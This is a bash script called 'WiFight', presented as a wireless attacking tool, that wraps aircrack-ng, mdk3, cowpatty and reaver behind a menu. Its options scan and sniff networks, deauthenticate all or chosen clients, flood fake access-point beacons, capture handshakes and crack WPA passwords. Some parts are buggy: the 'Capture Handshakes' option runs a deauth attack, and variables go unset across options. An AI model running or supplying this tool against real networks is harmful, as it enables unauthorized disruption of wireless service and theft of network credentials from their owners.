#Created by Ashish Dave (AD Hacker)
#Illegal use is prohibited & Changing name of tool too prohibited except for Modification


#!/bin/bash
while true;
do
airmon-ng start wlan0
clear
echo
echo "+=======================================+";
echo "|                                       |";
echo "|     AD ~ Wifi Fighter |  WiFight      |";
echo "|                                       |";
echo "+=======================================+";
echo
echo "Wifi Fighter | WiFight, A Wireless Attacking Tool";
echo "Created by AD h4Ck3R";
echo
echo "Copyright (c) by AD Hacker 0\99";
echo "Email : ad.hacker99@gmail.com";
echo "Website : adhacker.96.lt";
echo
echo "Usage ~ Wireless Attacking Tool";
echo
echo " Menu";
echo "------";
echo
echo "1) Scan Networks";
echo "2) Sniff Network";
echo "3) Deauth Users";
echo "4) FakeAP Beacons";
echo "5) Capture Handshakes";
echo "6) Crack WPA";
echo "7) Exit";
echo
echo -n "WiFight@shell ~ > ";
read opt;

if test $opt -eq 1
then
    gnome-terminal -x bash -c "airodump-ng wlan0mon; bash";

elif test $opt -eq 2
then
    echo
    echo -n "Enter bssid : ";
    read bssid;

    echo -n "Enter channel : ";
    read ch;

    echo -n "Enter filename to save : ";
    read file;
    gnome-terminal -x bash -c "airodump-ng --bssid $bssid -c $ch --showack wlan0mon -w $file";

elif test $opt -eq 5
then
    echo
    echo -n "Enter client's mac address : ";
    read mac;
    gnome-terminal -x bash -c "aireplay-ng -0 0 -a $bssid -c $mac wlan0mon; bash";

elif test $opt -eq 3
then
    echo
    echo "11) Deauth All";
    echo "22) Deauth Specific";
    read deauth;
    
    if test $deauth -eq 11
    then
        gnome-terminal -x bash -c "aireplay-ng -0 0 -a $bssid -a $bssid wlan0mon; bash";
    elif test $deauth -eq 22
    then
    	 echo
         echo -n "Enter client's mac address : ";
         read mac;
         gnome-terminal -x bash -c "aireplay-ng -0 0 -a $bssid -c $mac wlan0mon; bash";
     fi

elif test $opt -eq 4
then
    echo
    echo "88) Generate Random";
    echo "90) Generate from file";
    read bcn;

    if test $bcn -eq 88
    then
        gnome-terminal -x bash -c "iwconfig wlan0mon channel 10; echo "Generating"; mdk3 wlan0mon b -c 0";

    elif test $bcn -eq 90
    then
        echo
        echo -n "Enter file : ";
        read file;
        gnome-terminal -x bash -c "echo "Generating"; mdk3 wlan0mon b -f $file";
    fi
    
elif test $opt -eq 6
then
    echo
    echo "44) Aircrack";
    echo "55) Cowpatty";
    echo "66) Reaver";
    read crack;

    if test $crack -eq 44
    then
    echo
    echo -n "Enter wordlist : ";
    read wl;
    echo -n "Enter capture file : ";
    read cap;
    gnome-terminal -x bash -c "aircrack-ng -w ./$wl $cap; bash";
    
    elif test $crack -eq 55
    then
    echo -n "Enter wordlist : ";
    read wl;
    echo -n "Enter capture file : ";
    read cap;
    echo -n "Enter Network's Name : ";
    read ssid; 
    gnome-terminal -x bash -c "cowpatty -f $wl -r $cap -s $ssid; bash";

    elif test $crack -eq 66
    then
    gnome-terminal -x bash -c "reaver -i wlan0mon -b $bssid -vvv -K 1; bash";
    fi

elif test $opt -eq 7
then
airmon-ng stop wlan0mon
exit
fi
done
